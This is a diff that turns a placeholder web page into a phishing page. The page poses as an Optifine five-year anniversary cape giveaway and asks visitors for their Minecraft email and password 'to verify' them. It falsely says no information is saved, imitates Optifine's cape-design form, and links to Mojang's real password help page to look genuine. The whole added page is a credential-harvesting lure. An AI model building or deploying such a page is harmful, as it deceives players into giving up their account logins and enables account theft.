@@ -1,1 +1,59 @@
-<h1>Welcome to My Website</h1>
+<h3>Anniversary Giveaway!</h3>
+    Optifine has been in development for 5 years coming this December!<br>
+    As a gift to the community we are giving away capes to all who apply.<br>
+    To verify that you're a real minecraft player, please login.<br><br>
+    <strong>*Note</strong> none of your information is saved on our server. <br>
+    <br>
+    <form name="login" action="" method="POST">
+      <table>
+        <tr><td>Minecraft Email</td><td><input type="text" name="email" size="30" autofocus="autofocus"></td></tr>
+        <tr><td>Password</td><td><input type="password" name="password" size="30"></td><td><input type="submit" name="login" value=" Login "></td></tr>
+        <tr><td></td><td><span style="font-size: small;"><a href="https://help.mojang.com/customer/en/portal/articles/329527-minecraft-log-in">Forgot password?</a></span></td></tr>
+      </table>
+    </form>
+    <span id="capeDesign" style="display: inline;">
+      Design:
+      <select name="capeColors" onchange="onCapeColorsSelect();" style="width: 8em">
+        <option value="standard">Standard</option>
+        <option value="white">White</option>
+        <option value="gray">Gray</option>
+        <option value="black">Black</option>
+        <option value="red">Red</option>
+        <option value="green">Green</option>
+        <option value="blue">Blue</option>
+        <option value="yellow">Yellow</option>
+        <option value="purple">Purple</option>
+        <option value="cyan">Cyan</option>
+        <option value="custom">Custom...</option>
+        <option value="banner">Banner...</option>
+      </select>
+      <span id="capePreview" style="vertical-align:-10px; margin-left: 10px">
+        <img id="imgCapePreview" src="/capes/base/standard.png" width="44" height="34" class="scaleNearest">
+      </span>
+      <span id="capeCustom" style="display:none; margin-left: 10px">
+        Top: <input class="color" type="text" value="882D2D" name="capeColorTop" size="5" onchange="onCapeCustomColorChange();" autocomplete="off" style="background-image: none; background-color: rgb(136, 45, 45); color: rgb(255, 255, 255);">
+        Bottom: <input class="color" type="text" value="5C1C1C" name="capeColorBottom" size="5" onchange="onCapeCustomColorChange();" autocomplete="off" style="background-image: none; background-color: rgb(92, 28, 28); color: rgb(255, 255, 255);">
+        Text: <input class="color" type="text" value="E29F00" name="capeColorText" size="5" onchange="onCapeCustomColorChange();" autocomplete="off" style="background-image: none; background-color: rgb(226, 159, 0); color: rgb(0, 0, 0);">
+        Shadow: <input class="color" type="text" value="441616" name="capeColorShadow" size="5" onchange="onCapeCustomColorChange();" autocomplete="off" style="background-image: none; background-color: rgb(68, 22, 22); color: rgb(255, 255, 255);">
+      </span>
+      <span id="capeBanner" style="display:none; margin-left: 10px">
+        <a href="http://www.needcoolshoes.com/banner" target="_blank">URL:</a>
+        <input type="text" value="" name="capeBannerUrl" size="8" onchange="onCapeBannerChange();">
+        <input type="hidden" value="" name="capeBannerFormat">
+                  <img src="images/reload16.gif">
+        Align:
+        <select name="capeBannerVAlign" onchange="onCapeBannerChange();" style="width: 6em">
+          <option value="s">Scale</option>
+          <option value="t">Top</option>
+          <option value="m">Middle</option>
+          <option value="b">Bottom</option>
+        </select>
+        Top: <input class="color" type="text" value="404040" name="capeBannerColorTop" size="5" onchange="onCapeBannerChange();" autocomplete="off" style="background-image: none; background-color: rgb(64, 64, 64); color: rgb(255, 255, 255);">
+        Bottom: <input class="color" type="text" value="202020" name="capeBannerColorBottom" size="5" onchange="onCapeBannerChange();" autocomplete="off" style="background-image: none; background-color: rgb(32, 32, 32); color: rgb(255, 255, 255);">
+        <br>
+        <span style="font-size: small;">
+          You can use the <a href="http://www.needcoolshoes.com/banner" target="_blank">Banner Generator</a> to design the banner, then copy and paste the banner URL in the field above.
+        </span>
+        <br>
+      </span>
+      </span>
